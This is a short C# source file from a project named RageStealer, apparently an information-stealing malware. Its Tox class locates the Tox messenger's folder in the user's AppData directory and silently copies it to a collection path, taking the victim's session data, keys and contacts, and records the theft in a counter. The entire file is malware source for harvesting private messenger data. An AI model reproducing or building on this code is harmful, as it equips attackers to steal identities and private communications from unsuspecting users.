using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Messengers;

internal sealed class Tox
{
	private static readonly string ToxPath = Path.Combine(Paths.Appdata, "Tox");

	public static void GetSession(string sSavePath)
	{
		if (!Directory.Exists(ToxPath))
		{
			return;
		}
		try
		{
			Filemanager.CopyDirectory(ToxPath, sSavePath);
			Counter.Tox = true;
		}
		catch
		{
		}
	}
}
